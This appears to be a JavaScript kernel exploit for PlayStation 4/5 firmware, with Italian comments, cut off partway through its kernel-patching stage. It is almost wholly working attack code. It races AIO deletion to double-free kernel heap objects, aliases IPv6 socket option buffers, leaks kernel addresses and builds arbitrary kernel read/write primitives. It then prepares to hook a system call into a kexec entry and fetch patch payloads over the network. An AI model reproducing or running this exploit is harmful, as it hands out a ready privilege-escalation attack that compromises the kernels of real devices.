import { Int } from './module/int64.mjs';
import { mem } from './module/mem.mjs';
import { log, die, hex, hexdump } from './module/utils.mjs';
import { cstr, jstr } from './module/memtools.mjs';
import { page_size, context_size } from './module/offset.mjs';
import { Chain } from './module/chain.mjs';

import {
    View1, View2, View4,
    Word, Long, Pointer,
    Buffer,
} from './module/view.mjs';

import * as rop from './module/chain.mjs';
import * as config from './config.mjs';

const t1 = performance.now();

// Verifica versione firmware
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x100, 0x1250];
        } else {
            return [0x100, 0x1020];
        }
    })();
    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }
    return [is_ps4, version];
})();

// costanti socket e AIO
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;

const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;

const TCP_INFO = 0x20;
const size_tcp_info = 0xec;
const TCPS_ESTABLISHED = 4;

const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;

const MAP_SHARED = 1;
const MAP_FIXED = 0x10;

const RTP_SET = 1;
const RTP_PRIO_REALTIME = 2;

const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
const max_aio_ids = 0x80;

const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);

const main_core = 7;
const num_grooms = 0x200;
const num_handles = 0x100;
const num_sds = 0x100;
const num_alias = 10;
const num_races = 100;
const leak_len = 16;
const num_leaks = 5;
const num_clobbers = 8;

let chain = null;
var nogc = [];

// ------------------------------------------------------------
// VARIABILI GLOBALI PER TRACKING E DEBUG
// ------------------------------------------------------------
let debug_leak_ids_p    = null;
let debug_leak_ids_len  = 0;
let debug_sds           = [];
let debug_tcp_sds       = [];
let debug_evf_ids       = [];
let debug_barrier_id    = null;
let debug_suspended     = [];
let debug_kbase         = null;
let debug_offset661     = 0;
let debug_sy_narg       = 0;
let debug_sy_call       = new Int(0, 0);
let debug_sy_thrcnt     = 0;
let debug_exec_fd       = undefined;
let debug_write_fd      = undefined;
let debug_kpipe         = null;
let debug_pipe_save     = null;

// ------------------------------------------------------------
// HELPERS DI SYS
// ------------------------------------------------------------
async function init() {
    await rop.init();
    chain = new Chain();
    const pthread_offsets = new Map(Object.entries({
        'pthread_create'           : 0x25510,
        'pthread_join'             : 0xafa0,
        'pthread_barrier_init'     : 0x273d0,
        'pthread_barrier_wait'     : 0xa320,
        'pthread_barrier_destroy'  : 0xfea0,
        'pthread_exit'             : 0x77a0,
    }));
    rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
}

function sys_void(...args) {
    return chain.syscall_void(...args);
}

function sysi(...args) {
    return chain.sysi(...args);
}

function call_nze(...args) {
    const res = chain.call_int(...args);
    if (res !== 0) {
        fullCleanup();
        die(`call(${args[0]}) returned nonzero: ${res}`);
    }
}

// ------------------------------------------------------------
// FUNZIONI AIO
// ------------------------------------------------------------
function aio_submit_cmd(cmd, requests, num_requests, handles) {
    sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}

const _aio_errors = new View4(max_aio_ids);
const _aio_errors_p = _aio_errors.addr;

function aio_multi_delete(ids, num_ids, sce_errs = _aio_errors_p) {
    sysi('aio_multi_delete', ids, num_ids, sce_errs);
}

function aio_multi_poll(ids, num_ids, sce_errs = _aio_errors_p) {
    sysi('aio_multi_poll', ids.addr, num_ids, sce_errs);
}

function aio_multi_cancel(ids_p, num_ids, sce_errs = _aio_errors_p) {
    sysi('aio_multi_cancel', ids_p, num_ids, sce_errs);
}

function aio_multi_wait(ids, num_ids, sce_errs = _aio_errors_p) {
    sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
    const reqs1 = new Buffer(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        reqs1.write32(0x20 + i * 0x28, -1);
    }
    return reqs1;
}

function spray_aio(loops = 1, reqs1_p, num_reqs, ids_p, multi = true, cmd = AIO_CMD_READ) {
    const step = 4 * (multi ? num_reqs : 1);
    cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
    for (let i = 0, idx = 0; i < loops; i++) {
        aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
        idx += step;
    }
}

function poll_aio(ids, states, num_ids = ids.length) {
    if (states !== undefined) {
        states = states.addr;
    }
    aio_multi_poll(ids.addr, num_ids, states);
}

function cancel_aios(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        aio_multi_cancel(ids_p.add((bi << 2) * len), len);
    }
    if (rem) {
        aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
    }
}

function free_aios(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        const addr = ids_p.add((bi << 2) * len);
        aio_multi_cancel(addr, len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
    if (rem) {
        const addr = ids_p.add((num_batches << 2) * len);
        aio_multi_cancel(addr, rem);
        aio_multi_poll(addr, rem);
        aio_multi_delete(addr, rem);
    }
}

function free_aios2(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        const addr = ids_p.add((bi << 2) * len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
    if (rem) {
        const addr = ids_p.add((num_batches << 2) * len);
        aio_multi_poll(addr, rem);
        aio_multi_delete(addr, rem);
    }
}

// ------------------------------------------------------------
// FUNZIONI SOCKET/SETSOCKOPT/GETSOCKOPT
// ------------------------------------------------------------
function get_our_affinity(mask) {
    sysi(
        'cpuset_getaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        mask.addr,
    );
}

function set_our_affinity(mask) {
    sysi(
        'cpuset_setaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        mask.addr,
    );
}

function close(fd) {
    sysi('close', fd);
}

function new_socket() {
    return sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
    return sysi('socket', AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
    const size = new Word(optval.size);
    if (optlen !== undefined) {
        size[0] = optlen;
    }
    sysi('getsockopt', sd, level, optname, optval.addr, size.addr);
    return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
    sysi('setsockopt', sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
    if (optlen === undefined) {
        optlen = optval.size;
    }
    const addr = optval.addr;
    setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
    for (const sd of sds) {
        setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
    }
}

function build_rthdr(buf, size) {
    const len = ((size >> 3) - 1) & ~1;
    size = (len + 1) << 3;
    buf[0] = 0;
    buf[1] = len;
    buf[2] = 0;
    buf[3] = len >> 1;
    return size;
}

function spawn_thread(thread) {
    const ctx = new Buffer(context_size);
    const pthread = new Pointer();
    pthread.ctx = ctx;
    // pivot the pthread's stack pointer to our stack
    ctx.write64(0x38, thread.stack_addr);
    ctx.write64(0x80, thread.get_gadget('ret'));
    call_nze(
        'pthread_create',
        pthread.addr,
        0,
        chain.get_gadget('setcontext'),
        ctx.addr,
    );
    return pthread;
}

// ------------------------------------------------------------
// FUNZIONI PER LE FASI DELL’EXPLOIT
// ------------------------------------------------------------

// 1) make_aliased_rthdrs (zona 0x80 double free)
function make_aliased_rthdrs(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = new Buffer(size);
    const rsize = build_rthdr(buf, size);

    for (let loop = 0; loop < num_alias; loop++) {
        for (let i = 0; i < num_sds; i++) {
            buf.write32(marker_offset, i);
            set_rthdr(sds[i], buf, rsize);
        }
        for (let i = 0; i < sds.length; i++) {
            get_rthdr(sds[i], buf);
            const marker = buf.read32(marker_offset);
            if (marker !== i) {
                log(`aliased rthdrs at attempt: ${loop}`);
                const pair = [sds[i], sds[marker]];
                log(`found pair: ${pair}`);
                sds.splice(marker, 1);
                sds.splice(i, 1);
                free_rthdrs(sds);
                sds.push(new_socket(), new_socket());
                return pair;
            }
        }
    }
    // Cleanup parziale prima di uscire
    try {
        const zeroBuf = new Buffer(0x100);
        for (const sd of sds) {
            try {
                setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
                setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
                setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
            } catch (_) {}
            try { close(sd); } catch (_) {}
        }
    } catch (_) {}
    fullCleanup();
    die(`failed to make aliased rthdrs. size: ${hex(size)}`);
}

// 2) race_one (helper per doppia-free)
function race_one(request_addr, tcp_sd, barrier, racer, sds) {
    const sce_errs = new View4([-1, -1]);
    const thr_mask = new Word(1 << main_core);

    const thr = racer;
    thr.push_syscall(
        'cpuset_setaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        thr_mask.addr,
    );
    thr.push_syscall('rtprio_thread', RTP_SET, 0, rtprio.addr);
    thr.push_gadget('pop rax; ret');
    thr.push_value(1);
    thr.push_get_retval();
    thr.push_call('pthread_barrier_wait', barrier.addr);
    thr.push_syscall(
        'aio_multi_delete',
        request_addr,
        1,
        sce_errs.addr_at(1),
    );
    thr.push_call('pthread_exit', 0);

    const pthr = spawn_thread(thr);
    const thr_tid = pthr.read32(0);
    debug_suspended.push(thr_tid);
    debug_suspended = debug_suspended.slice();

    // wait for il worker a entrare nella barrier e dormire
    while (thr.retval_int === 0) {
        sys_void('sched_yield');
    }

    // entra nella barrier come ultimo waiter
    chain.push_call('pthread_barrier_wait', barrier.addr);
    chain.push_syscall('sched_yield');
    chain.push_syscall('thr_suspend_ucontext', thr_tid);
    chain.push_get_retval();
    chain.push_get_errno();
    chain.push_end();
    chain.run();
    chain.reset();

    const main_res = chain.retval_int;
    log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
    if (main_res === -1) {
        call_nze('pthread_join', pthr, 0);
        log("Thread join dopo no-suspend");
        return null;
    }

    let won_race = false;
    try {
        const poll_err = new View4(1);
        aio_multi_poll(request_addr, 1, poll_err.addr);
        log(`poll: ${hex(poll_err[0])}`);

        const info_buf = new View1(size_tcp_info);
        const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
        log(`info size: ${hex(info_size)}`);

        if (info_size !== size_tcp_info) {
            log(`Errore info_size: ${info_size}`);
            won_race = false;
        } else {
            const tcp_state = info_buf[0];
            log(`tcp_state: ${tcp_state}`);
            const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
            if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
                // PANIC: doppia free su zona 0x80
                aio_multi_delete(request_addr, 1, sce_errs.addr);
                won_race = true;
            }
        }
    } finally {
        log('resume thread\n');
        sysi('thr_resume_ucontext', thr_tid);
        call_nze('pthread_join', pthr, 0);
    }

    if (won_race) {
        log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
        if (sce_errs[0] !== sce_errs[1]) {
            log('ERROR: bad won_race values differ');
            fullCleanup();
            die('ERROR: bad won_race');
        }
        return make_aliased_rthdrs(sds);
    }
    return null;
}

// 3) double_free_reqs2 (0x80 zone)
function double_free_reqs2(sds) {
    function swap_bytes(x, byte_length) {
        let res = 0;
        for (let i = 0; i < byte_length; i++) {
            res |= ((x >> (8 * i)) & 0xff) << (8 * (byte_length - i - 1));
        }
        return res >>> 0;
    }
    function htons(x) {
        return swap_bytes(x, 2);
    }
    function htonl(x) {
        return swap_bytes(x, 4);
    }

    const server_addr = new Buffer(16);
    server_addr[1] = AF_INET;
    server_addr.write16(2, htons(5050));
    server_addr.write32(4, htonl(0x7f000001));

    const racer = new Chain();
    const barrier = new Long();
    call_nze('pthread_barrier_init', barrier.addr, 0, 2);
    debug_barrier_id = barrier; // track barrier

    const num_reqs = 3;
    const which_req = num_reqs - 1;
    const reqs1 = make_reqs1(num_reqs);
    const reqs1_p = reqs1.addr;
    const aio_ids = new View4(num_reqs);
    const aio_ids_p = aio_ids.addr;
    debug_leak_ids_p = aio_ids_p;
    debug_leak_ids_len = num_reqs;

    const req_addr = aio_ids.addr_at(which_req);
    const cmd = AIO_CMD_MULTI_READ;

    const sd_listen = new_tcp_socket();
    debug_tcp_sds.push(sd_listen);
    ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));

    sysi('bind', sd_listen, server_addr.addr, server_addr.size);
    sysi('listen', sd_listen, 1);

    for (let i = 0; i < num_races; i++) {
        const sd_client = new_tcp_socket();
        debug_tcp_sds.push(sd_client);
        sysi('connect', sd_client, server_addr.addr, server_addr.size);

        const sd_conn = sysi('accept', sd_listen, 0, 0);
        debug_tcp_sds.push(sd_conn);

        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
        reqs1.write32(0x20 + which_req * 0x28, sd_client);

        aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
        aio_multi_cancel(aio_ids_p, num_reqs);
        aio_multi_poll(aio_ids_p, num_reqs);

        close(sd_client);

        const res = race_one(req_addr, sd_conn, barrier, racer, sds);
        racer.reset();

        aio_multi_delete(aio_ids_p, num_reqs);
        close(sd_conn);

        if (res !== null) {
            call_nze('pthread_barrier_destroy', barrier.addr);
            return res;
        }
    }

    fullCleanup();
    die('failed aio double free');
}

// 4) new_evf / set_evf_flags / free_evf
function new_evf(flags) {
    const name = cstr('');
    return sysi('evf_create', name.addr, 0, flags);
}
function set_evf_flags(id, flags) {
    sysi('evf_clear', id, 0);
    sysi('evf_set', id, flags);
}
function free_evf(id) {
    sysi('evf_delete', id);
}

// 5) verify_reqs2 (helper per leak 0x100)
function verify_reqs2(buf, offset) {
    if (buf.read32(offset) !== AIO_CMD_WRITE) {
        return false;
    }
    const heap_prefixes = [];
    for (let i = 0x10; i <= 0x20; i += 8) {
        if (buf.read16(offset + i + 6) !== 0xffff) {
            return false;
        }
        heap_prefixes.push(buf.read16(offset + i + 4));
    }
    let state = buf.read32(offset + 0x38);
    if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
        return false;
    }
    if (!buf.read64(offset + 0x40).eq(0)) {
        return false;
    }
    for (let i = 0x48; i <= 0x50; i += 8) {
        if (buf.read16(offset + i + 6) === 0xffff) {
            if (buf.read16(offset + i + 4) !== 0xffff) {
                heap_prefixes.push(buf.read16(offset + i + 4));
            }
        } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
            return false;
        }
    }
    return heap_prefixes.every((e, i, a) => e === a[0]);
}

// 6) leak_kernel_addrs (0x100 leak)
function leak_kernel_addrs(sd_pair) {
    close(sd_pair[1]);
    const sd = sd_pair[0];
    const buf = new Buffer(0x80 * leak_len);

    log('confuse evf with rthdr');
    let evf = null;
    for (let i = 0; i < num_alias; i++) {
        const evfs = [];
        for (let j = 0; j < num_handles; j++) {
            const id = new_evf(0xf00 | j << 16);
            debug_evf_ids.push(id);
            evfs.push(id);
        }
        get_rthdr(sd, buf, 0x80);
        const flags32 = buf.read32(0);
        const candidate_evf = evfs[flags32 >>> 16];
        set_evf_flags(candidate_evf, flags32 | 1);
        get_rthdr(sd, buf, 0x80);
        if (buf.read32(0) === (flags32 | 1)) {
            evf = candidate_evf;
            break;
        }
        for (const id of evfs) {
            free_evf(id);
        }
    }
    if (evf === null) {
        fullCleanup();
        die('failed to confuse evf and rthdr');
    }
    set_evf_flags(evf, 0xff << 8);
    get_rthdr(sd, buf, 0x80);

    const kernel_addr = buf.read64(0x28);
    const kbuf_addr = buf.read64(0x40).sub(0x38);

    const num_elems = 6;
    const ucred = kbuf_addr.add(4);

    const leak_reqs = make_reqs1(num_elems);
    const leak_reqs_p = leak_reqs.addr;
    leak_reqs.write64(0x10, ucred);

    const leak_ids_len2 = num_handles * num_elems;
    const leak_ids2 = new View4(leak_ids_len2);
    debug_leak_ids_p = leak_ids2.addr;
    debug_leak_ids_len = leak_ids_len2;
    const leak_ids_p = leak_ids2.addr;

    log('find aio_entry');
    let reqs2_off = null;
    loop: for (let i = 0; i < num_leaks; i++) {
        get_rthdr(sd, buf, 0x80);
        spray_aio(num_handles, leak_reqs_p, num_elems, leak_ids_p, true, AIO_CMD_WRITE);
        get_rthdr(sd, buf, 0x80);
        for (let off = 0x80; off < buf.length; off += 0x80) {
            if (verify_reqs2(buf, off)) {
                reqs2_off = off;
                log(`found reqs2 at attempt: ${i}`);
                break loop;
            }
        }
        free_aios(leak_ids_p, leak_ids_len2);
    }
    if (reqs2_off === null) {
        fullCleanup();
        die('could not leak a reqs2');
    }
    log(`reqs2 offset: ${hex(reqs2_off)}`);

    get_rthdr(sd, buf, 0x80);
    const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
    log('leaked aio_entry:');
    hexdump(reqs2);

    const reqs1_addr = new Long(reqs2.read64(0x10));
    reqs1_addr.lo &= -0x100;
    log(`reqs1_addr: ${reqs1_addr}`);

    log('searching target_id');
    let target_id = null;
    let to_cancel_p = null;
    let to_cancel_len = null;
    for (let i = 0; i < leak_ids_len2; i += num_elems) {
        aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);
        get_rthdr(sd, buf, 0x80);
        const state = buf.read32(reqs2_off + 0x38);
        if (state === AIO_STATE_ABORTED) {
            log(`found target_id at batch: ${i / num_elems}`);
            target_id = new Word(leak_ids2[i]);
            log(`target_id: ${hex(target_id)}`);
            leak_ids2[i] = 0;
            const start = i + num_elems;
            to_cancel_p = leak_ids2.addr_at(start);
            to_cancel_len = leak_ids_len2 - start;
            break;
        }
    }
    if (target_id === null) {
        fullCleanup();
        die('target_id not found');
    }
    cancel_aios(to_cancel_p, to_cancel_len);
    free_aios2(leak_ids_p, leak_ids_len2);

    return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
}

// 7) make_aliased_pktopts (0x100 double free)
function make_aliased_pktopts(sds) {
    const tclass = new Word();
    for (let loop = 0; loop < num_alias; loop++) {
        for (let i = 0; i < num_sds; i++) {
            tclass[0] = i;
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
        }
        for (let i = 0; i < sds.length; i++) {
            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
            const marker = tclass[0];
            if (marker !== i) {
                log(`aliased pktopts at attempt: ${loop}`);
                const pair = [sds[i], sds[marker]];
                log(`found pair: ${pair}`);
                sds.splice(marker, 1);
                sds.splice(i, 1);
                for (let j = 0; j < 2; j++) {
                    const sd = new_socket();
                    ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
                    sds.push(sd);
                }
                return pair;
            }
        }
        for (let i = 0; i < num_sds; i++) {
            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        }
    }
    // Cleanup completo prima di uscire
    try {
        const zeroBuf = new Buffer(0x100);
        for (const sd of sds) {
            try {
                setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
                setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
                setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
            } catch (_) {}
            try { close(sd); } catch (_) {}
        }
    } catch (_) {}
    fullCleanup();
    die('failed to make aliased pktopts');
}

// 8) double_free_reqs1 (in 0x100 zone)
function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
    const max_leak_len = (0xff + 1) << 3;
    const buf = new Buffer(max_leak_len);

    const num_elems = max_aio_ids;
    const aio_reqs = make_reqs1(num_elems);
    const aio_reqs_p = aio_reqs.addr;

    const num_batches = 2;
    const aio_ids_len = num_batches * num_elems;
    const aio_ids = new View4(aio_ids_len);
    const aio_ids_p = aio_ids.addr;

    log('start overwrite rthdr with AIO queue entry loop');
    let aio_not_found = true;
    free_evf(evf);
    for (let i = 0; i < num_clobbers; i++) {
        spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
        if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
            log(`aliased at attempt: ${i}`);
            aio_not_found = false;
            cancel_aios(aio_ids_p, aio_ids_len);
            break;
        }
        free_aios(aio_ids_p, aio_ids_len);
    }
    if (aio_not_found) {
        fullCleanup();
        die('failed to overwrite rthdr');
    }

    const reqs2 = new Buffer(0x80);
    const rsize = build_rthdr(reqs2, reqs2.size);
    reqs2.write32(4, 5);
    reqs2.write64(0x18, reqs1_addr);
    const reqs3_off = 0x28;
    reqs2.write64(0x20, kbuf_addr.add(reqs3_off));
    reqs2.write32(reqs3_off, 1);
    reqs2.write32(reqs3_off + 4, 0);
    reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
    reqs2[reqs3_off + 0xc] = 0;
    reqs2.write32(reqs3_off + 0x28, 0x67b0000);
    reqs2.write64(reqs3_off + 0x38, 1);

    const states = new View4(num_elems);
    const states_p = states.addr;
    const addr_cache = [aio_ids_p];
    for (let i = 1; i < num_batches; i++) {
        addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
    }

    log('start overwrite AIO queue entry with rthdr loop');
    let req_id = null;
    close(sd);
    sd = null;
    loop: for (let i = 0; i < num_alias; i++) {
        for (const sd2 of sds) {
            set_rthdr(sd2, reqs2, rsize);
        }
        for (let batch = 0; batch < addr_cache.length; batch++) {
            states.fill(-1);
            aio_multi_cancel(addr_cache[batch], num_elems, states_p);
            const req_idx = states.indexOf(AIO_STATE_COMPLETE);
            if (req_idx !== -1) {
                log(`req_idx: ${req_idx}`);
                log(`found req_id at batch: ${batch}`);
                const aio_idx = batch * num_elems + req_idx;
                req_id = new Word(aio_ids[aio_idx]);
                log(`req_id: ${hex(req_id)}`);
                aio_ids[aio_idx] = 0;
                poll_aio(req_id, states);
                log(`states[${req_idx}]: ${hex(states[0])}`);
                let foundSd = null;
                for (let j = 0; j < sds.length; j++) {
                    const sd2 = sds[j];
                    get_rthdr(sd2, reqs2);
                    const done = reqs2[reqs3_off + 0xc];
                    if (done) {
                        hexdump(reqs2);
                        foundSd = sd2;
                        sds.splice(j, 1);
                        free_rthdrs(sds);
                        sds.push(new_socket());
                        break;
                    }
                }
                if (foundSd === null) {
                    fullCleanup();
                    die("can't find sd that overwrote AIO queue entry");
                }
                sd = foundSd;
                log(`sd: ${sd}`);
                break loop;
            }
        }
    }
    if (req_id === null) {
        fullCleanup();
        die('failed to overwrite AIO queue entry');
    }
    free_aios2(aio_ids_p, aio_ids_len);

    poll_aio(target_id, states);
    const sce_errs = new View4([-1, -1]);
    const target_ids = new View4([req_id, target_id]);
    aio_multi_delete(target_ids.addr, 2, sce_errs.addr);

    let pktopts_sds = null;
    let dirty_sd = null;
    try {
        const pair = make_aliased_pktopts(sds);
        pktopts_sds = pair;
        dirty_sd = sd;
    } catch (e) {
        fullCleanup();
        die('error in make_aliased_pktopts');
    }
    return [pktopts_sds, dirty_sd];
}

// 9) make_kernel_arw (ottieni primitive R/W)
function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
    const psd = pktopts_sds[0];
    const tclass = new Word();
    const off_tclass = is_ps4 ? 0xb0 : 0xc0;

    const pktopts = new Buffer(0x100);
    const rsize = build_rthdr(pktopts, pktopts.size);
    const pktinfo_p = k100_addr.add(0x10);
    pktopts.write64(0x10, pktinfo_p);

    log('overwrite main pktopts');
    let reclaim_sd = null;
    close(pktopts_sds[1]);
    for (let i = 0; i < num_alias; i++) {
        for (let j = 0; j < sds.length; j++) {
            pktopts.write32(off_tclass, 0x4141 | j << 16);
            set_rthdr(sds[j], pktopts, rsize);
        }
        gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
        const marker = tclass[0];
        if ((marker & 0xffff) === 0x4141) {
            log(`found reclaim sd at attempt: ${i}`);
            const idx = marker >>> 16;
            reclaim_sd = sds[idx];
            sds.splice(idx, 1);
            break;
        }
    }
    if (reclaim_sd === null) {
        fullCleanup();
        die('failed to overwrite main pktopts');
    }

    const pipes = new View4(2);
    sysi('pipe', pipes.addr);
    const read_fd = pipes[0];
    const write_fd = pipes[1];
    debug_kpipe = null; // verrà assegnato appena fatto il leak
    debug_pipe_save = new Buffer(0x100);
    debug_exec_fd = undefined;
    debug_write_fd = undefined;

    // Funzioni kernel_read e kernel_write tramite pipe
    function kread64(addr) {
        const len = 8;
        let offset = 0;
        const read_buf = new Buffer(8);
        const read_buf_p = read_buf.addr;
        const nhop = new Word();
        const nhop_p = nhop.addr;
        const pkt_buf = new Buffer(0x14);
        const data_buf = new Buffer(0x14);
        while (offset < len) {
            pkt_buf.write64(0, addr.add(offset));
            nhop[0] = len - offset;
            ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pkt_buf);
            sysi('getsockopt', psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf_p.add(offset), nhop_p);
            const n = nhop[0];
            if (n === 0) {
                read_buf[offset] = 0;
                offset += 1;
            } else {
                offset += n;
            }
        }
        return read_buf.read64(0);
    }
    function kwrite64(addr, value) {
        const buf2 = new Buffer(0x14);
        buf2.write64(0, value);
        copyin(buf2.addr, addr, 8);
    }
    function copyin(src, dst, len) {
        const addr_buf = new Buffer(0x14);
        const data_buf = new Buffer(0x14);
        // primo passo: posiziona kpipe in addr_buf
        addr_buf.write64(0, debug_kpipe);
        ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
        data_buf.write64(0, 0);
        ssockopt(dirty_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
        addr_buf.write64(0, debug_kpipe.add(0x10));
        ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
        addr_buf.write64(0, dst);
        ssockopt(dirty_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
        sysi('write', write_fd, src, len);
    }
    function copyout(src, dst, len) {
        const addr_buf = new Buffer(0x14);
        const data_buf = new Buffer(0x14);
        addr_buf.write64(0, debug_kpipe);
        ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
        data_buf.write32(0, 0x40000000);
        ssockopt(dirty_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
        addr_buf.write64(0, debug_kpipe.add(0x10));
        ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
        addr_buf.write64(0, src);
        ssockopt(dirty_sd, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
        sysi('read', read_fd, dst, len);
    }

    // Leak dell’indirizzo pipebuf in kernel
    const pipes_read_fd = read_fd;
    const pipes_write_fd = write_fd;
    const ofiles = kread64(kernel_addr.add(is_ps4 ? 0x40 : 0x40)); // td->td_proc->p_fd->fd_ofiles
    const pipe_file = kread64(ofiles.add(pipes_read_fd * 8));
    const kpipe = kread64(pipe_file);
    debug_kpipe = kpipe;
    log(`kpipe address: 0x${kpipe.toString(16)}`);

    // Backup pipebuf (0x100 byte)
    for (let off = 0; off < debug_pipe_save.size; off += 8) {
        debug_pipe_save.write64(off, kread64(kpipe.add(off)));
    }

    // Save JIT-FD nel debug
    debug_exec_fd = sysi('jitshm_create', 0, (is_ps4 ? 0x1000 : 0x1000), 7);
    debug_write_fd = sysi('jitshm_alias', debug_exec_fd, 3);

    // Prepara syscall hook
    const off_sys421 = 0x1107f00; // sysent[661] per PS4 9.00
    const sysent_661 = debug_kbase.add(off_sys421);
    debug_offset661 = off_sys421;
    debug_sy_narg = kread64(sysent_661).lo;
    debug_sy_call = kread64(sysent_661.add(8));
    debug_sy_thrcnt = kread64(sysent_661.add(0x2c)).lo;

    return { psd, dirty_sd, kread64, kwrite64, pipes_read_fd, pipes_write_fd, kpipe, rsize };
}

// 10) patch_kernel (modifica sysent, abilita JIT, mappa patch ELF)
async function get_patches(url) {
    const response = await fetch(url);
    if (!response.ok) {
        fullCleanup();
        throw Error(`Network response not OK, status: ${response.status}`);
    }
    return response.arrayBuffer();
}

async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
    if (!is_ps4) {
        fullCleanup();
        throw RangeError('PS5 kernel patching unsupported');
    }
    if (!(0x800 <= version && version < 0x900)) {
        fullCleanup();
        throw RangeError('kernel patching unsupported');
    }

    log('change sys_aio_submit() to sys_kexec()');
    const offset_sysent_661 = debug_offset661;
